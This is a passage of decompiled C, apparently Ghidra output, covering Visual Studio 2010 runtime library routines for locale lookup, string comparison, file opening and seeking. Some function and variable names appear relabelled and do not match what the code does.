                                + 0x1001,&stack0xffffff80,0x78);
  uVar7 = extraout_EDX_05;
  if (iVar5 == 0) goto LAB_003bbdd1;
  iVar5 = __stricmp((char *)p_Var2->pchLanguage,&stack0xffffff80);
  uVar7 = extraout_EDX_06;
  if (iVar5 == 0) {
    puVar1 = (uint *)&(p_Var4->_setloc_data).iLocState;
    *puVar1 = *puVar1 | 0x200;
    if ((p_Var4->_setloc_data).bAbbrevLanguage == 0) {
      if (((p_Var4->_setloc_data).iPrimaryLen != 0) &&
         (sVar6 = _strlen((char *)p_Var2->pchLanguage), uVar7 = extraout_EDX_07,
         sVar6 == (p_Var4->_setloc_data).iPrimaryLen)) {
        iVar5 = 1;
        goto LAB_003bbf19;
      }
      goto LAB_003bbf26;
    }
    (p_Var4->_setloc_data).iLocState = (p_Var4->_setloc_data).iLocState | 0x100;
  }
  else {
    if ((((p_Var4->_setloc_data).bAbbrevLanguage != 0) || ((p_Var4->_setloc_data).iPrimaryLen == 0))
       || (iVar5 = __stricmp((char *)p_Var2->pchLanguage,&stack0xffffff80), uVar7 = extraout_EDX_08,
          iVar5 != 0)) goto LAB_003bbf40;
    iVar5 = 0;
LAB_003bbf19:
    iVar5 = _TestDefaultLanguage(iVar5,(char **)p_Var2);
    uVar7 = extraout_EDX_09;
    if (iVar5 == 0) goto LAB_003bbf40;
LAB_003bbf26:
    puVar1 = (uint *)&(p_Var4->_setloc_data).iLocState;
    *puVar1 = *puVar1 | 0x100;
  }
  if ((p_Var4->_setloc_data)._cachecp == 0) {
    (p_Var4->_setloc_data)._cachecp = Locale;
  }
LAB_003bbf40:
  terminate_if_debugger_present(uVar3 ^ (uint)&stack0xfffffffc,uVar7,in_stack_ffffff80);
  return;
}



// Library Function - Single Match
//  _LanguageEnumProc@4
// 
// Library: Visual Studio 2010 Release
// lpLocaleEnumProc parameter of EnumSystemLocalesA
// 

void _LanguageEnumProc_4(char *param_1)

{
  uint *puVar1;
  _setloc_struct *p_Var2;
  uint uVar3;
  _ptiddata p_Var4;
  LCID Locale;
  int iVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar6;
  CHAR in_stack_ffffff80;
  
  uVar3 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  p_Var4 = __getptd();
  p_Var2 = &p_Var4->_setloc_data;
  Locale = _LcidFromHexString(extraout_ECX,param_1);
  iVar5 = GetLocaleInfoA(Locale,(-(uint)((p_Var4->_setloc_data).bAbbrevLanguage != 0) & 0xfffff002)
                                + 0x1001,&stack0xffffff80,0x78);
  if (iVar5 == 0) {
    (p_Var4->_setloc_data).iLocState = 0;
    uVar6 = extraout_EDX;
    goto LAB_003bc001;
  }
  iVar5 = __stricmp((char *)p_Var2->pchLanguage,&stack0xffffff80);
  uVar6 = extraout_EDX_00;
  if (iVar5 == 0) {
    if ((p_Var4->_setloc_data).bAbbrevLanguage == 0) {
      iVar5 = 1;
      goto LAB_003bbfdf;
    }
  }
  else {
    if ((((p_Var4->_setloc_data).bAbbrevLanguage != 0) || ((p_Var4->_setloc_data).iPrimaryLen == 0))
       || (iVar5 = __stricmp((char *)p_Var2->pchLanguage,&stack0xffffff80), uVar6 = extraout_EDX_01,
          iVar5 != 0)) goto LAB_003bc001;
LAB_003bbfdf:
    iVar5 = _TestDefaultLanguage(iVar5,(char **)p_Var2);
    uVar6 = extraout_EDX_02;
    if (iVar5 == 0) goto LAB_003bc001;
  }
  puVar1 = (uint *)&(p_Var4->_setloc_data).iLocState;
  *puVar1 = *puVar1 | 4;
  (p_Var4->_setloc_data)._cachecp = Locale;
  *(LCID *)(p_Var4->_setloc_data)._cachein = Locale;
LAB_003bc001:
  terminate_if_debugger_present(uVar3 ^ (uint)&stack0xfffffffc,uVar6,in_stack_ffffff80);
  return;
}



// Library Function - Single Match
//  _GetLcidFromLangCountry
// 
// Library: Visual Studio 2010 Release

void _GetLcidFromLangCountry(void)

{
  size_t sVar1;
  char *pcVar2;
  char **unaff_ESI;
  
  pcVar2 = *unaff_ESI;
  sVar1 = _strlen(pcVar2);
  unaff_ESI[4] = (char *)(uint)(sVar1 == 3);
  sVar1 = _strlen(unaff_ESI[1]);
  unaff_ESI[6] = (char *)0x0;
  unaff_ESI[5] = (char *)(uint)(sVar1 == 3);
  if (unaff_ESI[4] == (char *)0x0) {
    pcVar2 = (char *)_GetPrimaryLen(pcVar2,*unaff_ESI);
  }
  else {
    pcVar2 = (char *)0x2;
  }
  unaff_ESI[3] = pcVar2;
  EnumSystemLocalesA(_LangCountryEnumProc_4,1);
  pcVar2 = unaff_ESI[2];
  if (((((uint)pcVar2 & 0x100) == 0) || (((uint)pcVar2 & 0x200) == 0)) || (((uint)pcVar2 & 7) == 0))
  {
    unaff_ESI[2] = (char *)0x0;
  }
  return;
}



// Library Function - Single Match
//  _GetLcidFromLanguage
// 
// Library: Visual Studio 2010 Release

void _GetLcidFromLanguage(void)

{
  size_t sVar1;
  char *pcVar2;
  char **unaff_ESI;
  
  pcVar2 = *unaff_ESI;
  sVar1 = _strlen(pcVar2);
  unaff_ESI[4] = (char *)(uint)(sVar1 == 3);
  if ((char *)(uint)(sVar1 == 3) == (char *)0x0) {
    pcVar2 = (char *)_GetPrimaryLen(pcVar2,*unaff_ESI);
  }
  else {
    pcVar2 = (char *)0x2;
  }
  unaff_ESI[3] = pcVar2;
  EnumSystemLocalesA(_LanguageEnumProc_4,1);
  if ((*(byte *)(unaff_ESI + 2) & 4) == 0) {
    unaff_ESI[2] = (char *)0x0;
  }
  return;
}



// Library Function - Single Match
//  ___get_qualified_locale
// 
// Library: Visual Studio 2010 Release

BOOL __cdecl ___get_qualified_locale(LPLC_STRINGS _LpInStr,UINT *_LpCodePage,LPLC_STRINGS _LpOutStr)

{
  uint *puVar1;
  wchar_t **ppwVar2;
  _setloc_struct *p_Var3;
  bool bVar4;
  _ptiddata p_Var5;
  wchar_t *pwVar6;
  undefined3 extraout_var;
  size_t sVar7;
  LCID LVar8;
  UINT _Value;
  BOOL BVar9;
  errno_t eVar10;
  int iVar11;
  
  p_Var5 = __getptd();
  p_Var3 = &p_Var5->_setloc_data;
  if (_LpInStr == (LPLC_STRINGS)0x0) {
    puVar1 = (uint *)&(p_Var5->_setloc_data).iLocState;
    *puVar1 = *puVar1 | 0x104;
LAB_003bc19d:
    LVar8 = GetUserDefaultLCID();
    (p_Var5->_setloc_data)._cachecp = LVar8;
    *(LCID *)(p_Var5->_setloc_data)._cachein = LVar8;
LAB_003bc1a9:
    if ((p_Var5->_setloc_data).iLocState == 0) {
      return 0;
    }
  }
  else {
    p_Var3->pchLanguage = _LpInStr->szLanguage;
    pwVar6 = _LpInStr->szLanguage + 0x20;
    ppwVar2 = &(p_Var5->_setloc_data).pchCountry;
    *ppwVar2 = pwVar6;
    if ((pwVar6 != (wchar_t *)0x0) && (*(char *)pwVar6 != '\0')) {
      FUN_003bbb27((int)&PTR_s_america_003c8c70,0x16,(char **)ppwVar2);
    }
    (p_Var5->_setloc_data).iLocState = 0;
    if ((p_Var3->pchLanguage == (wchar_t *)0x0) || (*(char *)p_Var3->pchLanguage == '\0')) {
      pwVar6 = *ppwVar2;
      if ((pwVar6 == (wchar_t *)0x0) || (*(char *)pwVar6 == '\0')) {
        (p_Var5->_setloc_data).iLocState = 0x104;
        goto LAB_003bc19d;
      }
      sVar7 = _strlen((char *)pwVar6);
      (p_Var5->_setloc_data).bAbbrevCountry = (uint)(sVar7 == 3);
      EnumSystemLocalesA(_CountryEnumProc_4,1);
      if ((*(byte *)&(p_Var5->_setloc_data).iLocState & 4) == 0) {
        (p_Var5->_setloc_data).iLocState = 0;
      }
      goto LAB_003bc1a9;
    }
    if ((*ppwVar2 == (wchar_t *)0x0) || (*(char *)*ppwVar2 == '\0')) {
      _GetLcidFromLanguage();
    }
    else {
      _GetLcidFromLangCountry();
    }
    if ((p_Var5->_setloc_data).iLocState == 0) {
      bVar4 = FUN_003bbb27((int)&PTR_s_american_003c8a68,0x40,(char **)p_Var3);
      if (CONCAT31(extraout_var,bVar4) != 0) {
        if ((*ppwVar2 == (wchar_t *)0x0) || (*(char *)*ppwVar2 == '\0')) {
          _GetLcidFromLanguage();
        }
        else {
          _GetLcidFromLangCountry();
        }
      }
      goto LAB_003bc1a9;
    }
  }
  _Value = _ProcessCodePage();
  if (_Value == 0) {
    return 0;
  }
  if (_Value == 65000) {
    return 0;
  }
  if (_Value == 0xfde9) {
    return 0;
  }
  BVar9 = IsValidCodePage(_Value & 0xffff);
  if (BVar9 == 0) {
    return 0;
  }
  BVar9 = IsValidLocale((p_Var5->_setloc_data)._cachecp,1);
  if (BVar9 == 0) {
    return 0;
  }
  if (_LpCodePage != (UINT *)0x0) {
    *(undefined2 *)_LpCodePage = *(undefined2 *)&(p_Var5->_setloc_data)._cachecp;
    *(wchar_t *)((int)_LpCodePage + 2) = (p_Var5->_setloc_data)._cachein[0];
    *(short *)(_LpCodePage + 1) = (short)_Value;
  }
  if (_LpOutStr == (LPLC_STRINGS)0x0) {
    return 1;
  }
  if (*(short *)_LpCodePage == 0x814) {
    eVar10 = _strcpy_s((char *)_LpOutStr,0x40,"Norwegian-Nynorsk");
    if (eVar10 == 0) goto LAB_003bc272;
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  iVar11 = GetLocaleInfoA((p_Var5->_setloc_data)._cachecp,0x1001,(LPSTR)_LpOutStr,0x40);
  if (iVar11 == 0) {
    return 0;
  }
LAB_003bc272:
  iVar11 = GetLocaleInfoA(*(LCID *)(p_Var5->_setloc_data)._cachein,0x1002,
                          (LPSTR)(_LpOutStr->szLanguage + 0x20),0x40);
  if (iVar11 == 0) {
    return 0;
  }
  __itoa_s(_Value,(char *)_LpOutStr->szCountry,0x10,10);
  return 1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2010 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,unsigned_long param_2,char *param_3,int param_4,
          unsigned_short *param_5,int param_6,int param_7,int param_8)

{
  uint _Size;
  uint uVar1;
  uint cchWideChar;
  undefined (*pauVar2) [16];
  BOOL BVar3;
  int iVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar5;
  undefined (*lorem_ipsum) [16];
  undefined uVar6;
  
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar6 = 0;
  if (param_6 == 0) {
    param_6 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_6,(uint)(param_7 != 0) * 8 + 1,param_3,param_4,(LPWSTR)0x0
                                    ,0);
  uVar5 = extraout_EDX;
  if (cchWideChar == 0) goto LAB_003bc37a;
  lorem_ipsum = (undefined (*) [16])0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      pauVar2 = (undefined (*) [16])&stack0xffffffe8;
      lorem_ipsum = (undefined (*) [16])&stack0xffffffe8;
      if ((undefined *)register0x00000010 != (undefined *)0x18) {
LAB_003bc334:
        lorem_ipsum = (undefined (*) [16])(*pauVar2 + 8);
      }
    }
    else {
      pauVar2 = (undefined (*) [16])_malloc(_Size);
      uVar5 = extraout_EDX_00;
      lorem_ipsum = pauVar2;
      if (pauVar2 != (undefined (*) [16])0x0) {
        *(undefined4 *)*pauVar2 = 0xdddd;
        goto LAB_003bc334;
      }
    }
  }
  if (lorem_ipsum != (undefined (*) [16])0x0) {
    trim_string(lorem_ipsum,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar(param_6,1,param_3,param_4,(LPWSTR)lorem_ipsum,cchWideChar);
    if (iVar4 != 0) {
      BVar3 = GetStringTypeW(param_2,(LPCWSTR)lorem_ipsum,iVar4,(LPWORD)param_5);
      uVar6 = (undefined)BVar3;
    }
    __freea(lorem_ipsum);
    uVar5 = extraout_EDX_01;
  }
LAB_003bc37a:
  iVar4 = terminate_if_debugger_present(uVar1 ^ (uint)&stack0xfffffffc,uVar5,uVar6);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2010 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  pthreadlocinfo in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)&stack0xffffffec,_DWInfoType,_LpSrcStr,_CchSrc,
                     (unsigned_short *)_LpCharType,_Code_page,in_stack_00000020,
                     (int)in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  _strncmp
// 
// Library: Visual Studio 2010 Release

int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  byte *pbVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  if (_MaxCount != 0) {
    if ((3 < _MaxCount) && (pbVar1 = (byte *)_Str1, pbVar3 = (byte *)_Str2, _MaxCount != 4)) {
      do {
        _Str1 = (char *)(pbVar1 + 4);
        _Str2 = (char *)(pbVar3 + 4);
        if ((*pbVar1 == 0) || (*pbVar1 != *pbVar3)) {
          uVar2 = (uint)*pbVar1;
          uVar4 = (uint)*pbVar3;
          goto LAB_003bc488;
        }
        if ((pbVar1[1] == 0) || (pbVar1[1] != pbVar3[1])) {
          uVar2 = (uint)pbVar1[1];
          uVar4 = (uint)pbVar3[1];
          goto LAB_003bc488;
        }
        if ((pbVar1[2] == 0) || (pbVar1[2] != pbVar3[2])) {
          uVar2 = (uint)pbVar1[2];
          uVar4 = (uint)pbVar3[2];
          goto LAB_003bc488;
        }
        if ((pbVar1[3] == 0) || (pbVar1[3] != pbVar3[3])) {
          uVar2 = (uint)pbVar1[3];
          uVar4 = (uint)pbVar3[3];
          goto LAB_003bc488;
        }
        local_8 = local_8 + 4;
        pbVar1 = (byte *)_Str1;
        pbVar3 = (byte *)_Str2;
      } while (local_8 < _MaxCount - 4);
    }
    for (; local_8 < _MaxCount; local_8 = local_8 + 1) {
      if ((*_Str1 == 0) || (*_Str1 != *_Str2)) {
        uVar2 = (uint)(byte)*_Str1;
        uVar4 = (uint)(byte)*_Str2;
LAB_003bc488:
        return uVar2 - uVar4;
      }
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = (char *)((byte *)_Str2 + 1);
    }
  }
  return 0;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio 2010 Release

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  byte *pbVar3;
  undefined4 uStack40;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined4 uStack24;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  uStack12 = 0;
  uStack16 = 0;
  uStack20 = 0;
  uStack24 = 0;
  uStack28 = 0;
  uStack32 = 0;
  uStack36 = 0;
  uStack40 = 0;
  for (; bVar1 = *_Control, bVar1 != 0; _Control = (char *)((byte *)_Control + 1)) {
    pbVar2 = (byte *)((int)&uStack40 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar3 = (byte *)_Str;
    pbVar2 = (byte *)(uint)*pbVar3;
    if (*pbVar3 == 0) {
      return (char *)pbVar2;
    }
    _Str = (char *)(pbVar3 + 1);
  } while ((*(byte *)((int)&uStack40 + ((int)pbVar2 >> 3)) >> ((uint)pbVar2 & 7) & 1) == 0);
  return (char *)pbVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __openfile
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __openfile(char *_Filename,char *_Mode,int _ShFlag,FILE *_File)

{
  char cVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  uchar uVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  char *pcVar9;
  uchar *puVar10;
  uchar *puVar11;
  int local_c;
  uint local_8;
  
  _OpenFlag = 0;
  bVar3 = false;
  local_c = 0;
  bVar4 = false;
  for (pcVar9 = _Mode; *pcVar9 == ' '; pcVar9 = pcVar9 + 1) {
  }
  cVar1 = *pcVar9;
  if (cVar1 == 'a') {
    _OpenFlag = 0x109;
LAB_003bc52f:
    local_8 = DAT_003d8a4c | 2;
  }
  else {
    if (cVar1 != 'r') {
      if (cVar1 != 'w') {
        piVar6 = __errno();
        *piVar6 = 0x16;
        FUN_003b60f9();
        return (FILE *)0x0;
      }
      _OpenFlag = 0x301;
      goto LAB_003bc52f;
    }
    local_8 = DAT_003d8a4c | 1;
  }
  bVar2 = true;
  puVar10 = (uchar *)(pcVar9 + 1);
  uVar5 = *puVar10;
  if (uVar5 != '\0') {
    do {
      if (!bVar2) break;
      iVar7 = (int)(char)uVar5;
      if (iVar7 < 0x54) {
        if (iVar7 == 0x53) {
          if (local_c != 0) goto LAB_003bc659;
          local_c = 1;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else {
          if (iVar7 != 0x20) {
            if (iVar7 == 0x2b) {
              if ((_OpenFlag & 2) != 0) goto LAB_003bc659;
              _OpenFlag = _OpenFlag & 0xfffffffe | 2;
              local_8 = local_8 & 0xfffffffc | 0x80;
            }
            else {
              if (iVar7 == 0x2c) {
                bVar4 = true;
LAB_003bc659:
                bVar2 = false;
              }
              else {
                if (iVar7 == 0x44) {
                  if ((_OpenFlag & 0x40) != 0) goto LAB_003bc659;
                  _OpenFlag = _OpenFlag | 0x40;
                }
                else {
                  if (iVar7 == 0x4e) {
                    _OpenFlag = _OpenFlag | 0x80;
                  }
                  else {
                    if (iVar7 != 0x52) goto LAB_003bc70e;
                    if (local_c != iVar7 + -0x52) goto LAB_003bc659;
                    local_c = 1;
                    _OpenFlag = _OpenFlag | 0x10;
                  }
                }
              }
            }
          }
        }
      }
      else {
        if (iVar7 == 0x54) {
          if ((_OpenFlag & 0x1000) != 0) goto LAB_003bc659;
          _OpenFlag = _OpenFlag | 0x1000;
        }
        else {
          if (iVar7 == 0x62) {
            if ((_OpenFlag & 0xc000) != 0) goto LAB_003bc659;
            _OpenFlag = _OpenFlag | 0x8000;
          }
          else {
            if (iVar7 == 99) {
              if (bVar3) goto LAB_003bc659;
              local_8 = local_8 | 0x4000;
              bVar3 = true;
            }
            else {
              if (iVar7 == 0x6e) {
                if (bVar3) goto LAB_003bc659;
                local_8 = local_8 & 0xffffbfff;
                bVar3 = true;
              }
              else {
                if (iVar7 != 0x74) goto LAB_003bc70e;
                if ((_OpenFlag & 0xc000) != 0) goto LAB_003bc659;
                _OpenFlag = _OpenFlag | 0x4000;
              }
            }
          }
        }
      }
      puVar10 = puVar10 + 1;
      uVar5 = *puVar10;
    } while (uVar5 != '\0');
    if (bVar4) {
      for (; *puVar10 == ' '; puVar10 = puVar10 + 1) {
      }
      iVar7 = __mbsnbcmp("ccs",puVar10,3);
      if (iVar7 != 0) goto LAB_003bc70e;
      for (puVar10 = puVar10 + 3; *puVar10 == ' '; puVar10 = puVar10 + 1) {
      }
      if (*puVar10 != '=') goto LAB_003bc70e;
      do {
        puVar11 = puVar10;
        puVar10 = puVar11 + 1;
      } while (*puVar10 == ' ');
      iVar7 = __mbsnbicmp(puVar10,(uchar *)"UTF-8",5);
      if (iVar7 == 0) {
        puVar10 = puVar11 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __mbsnbicmp(puVar10,(uchar *)"UTF-16LE",8);
        if (iVar7 == 0) {
          puVar10 = puVar11 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __mbsnbicmp(puVar10,(uchar *)"UNICODE",7);
          if (iVar7 != 0) goto LAB_003bc70e;
          puVar10 = puVar11 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *puVar10 == ' '; puVar10 = puVar10 + 1) {
  }
  if (*puVar10 == '\0') {
    eVar8 = __sopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_003d7ce0 = _DAT_003d7ce0 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_003bc70e:
  piVar6 = __errno();
  *piVar6 = 0x16;
  FUN_003b60f9();
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int _Index;
  FILE *pFVar6;
  FILE *_File;
  
  pFVar6 = (FILE *)0x0;
  __lock(1);
  _Index = 0;
  do {
    _File = pFVar6;
    if (DAT_003eb1a0 <= _Index) {
LAB_003bc860:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_003bc891();
      return _File;
    }
    piVar1 = (int *)(DAT_003ea180 + _Index * 4);
    if (*piVar1 == 0) {
      pvVar4 = __malloc_crt(0x38);
      *(void **)(DAT_003ea180 + _Index * 4) = pvVar4;
      if (pvVar4 != (void *)0x0) {
        BVar5 = InitializeCriticalSectionAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_003ea180 + _Index * 4) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(DAT_003ea180 + _Index * 4));
          *(undefined4 *)(DAT_003ea180 + _Index * 4) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_003ea180 + _Index * 4) + 0x20));
          _File = *(FILE **)(DAT_003ea180 + _Index * 4);
          _File->_flag = 0;
        }
      }
      goto LAB_003bc860;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((_Index - 3U < 0x11) && (iVar3 = __mtinitlocknum(_Index + 0x10), iVar3 == 0))
      goto LAB_003bc860;
      __lock_file2(_Index,*(void **)(DAT_003ea180 + _Index * 4));
      _File = *(FILE **)(DAT_003ea180 + _Index * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_003bc860;
      __unlock_file2(_Index,_File);
    }
    _Index = _Index + 1;
  } while( true );
}



void FUN_003bc891(void)

{
  FUN_003b8677(1);
  return;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Library: Visual Studio 2010 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  uint local_20;
  uint uStack28;
  int iStack24;
  uint *puStack20;
  
  puStack20 = param_1;
  iStack24 = param_2;
  uStack28 = param_3;
  puStack36 = &LAB_003bc930;
  uStack40 = *in_FS_OFFSET;
  local_20 = DAT_003d6664 ^ (uint)&uStack40;
  *in_FS_OFFSET = &uStack40;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_003be814();
    }
  }
  *in_FS_OFFSET = uStack40;
  return;
}



void FUN_003bc976(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x003bc9c0. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind2@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_GlobalUnwind2_8(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  _release_context(param_1,(PVOID)0x3bc9d6,param_2,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2010 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2010 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_003bcb33();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_003b60f9();
  }
  return -1;
}



void FUN_003bcb33(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2010 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  char *pcVar5;
  FILE *pFVar6;
  long lVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_8;
  
  pFVar6 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_003b60f9();
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_8 = __lseek(_FileHandle,0,1);
  if (local_8 < 0) {
LAB_003bcc8d:
    lVar7 = -1;
  }
  else {
    uVar1 = _File->_flag;
    if ((uVar1 & 0x108) == 0) {
      return local_8 - _File->_cnt;
    }
    pcVar5 = _File->_ptr;
    pcVar8 = _File->_base;
    local_10 = (int)pcVar5 - (int)pcVar8;
    if ((uVar1 & 3) == 0) {
      if (-1 < (char)uVar1) {
        piVar3 = __errno();
        *piVar3 = 0x16;
        goto LAB_003bcc8d;
      }
    }
    else {
      pcVar2 = pcVar8;
      if ((*(byte *)((&DAT_003ea060)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x40) &
          0x80) != 0) {
        for (; pcVar2 < pcVar5; pcVar2 = pcVar2 + 1) {
          if (*pcVar2 == '\n') {
            local_10 = local_10 + 1;
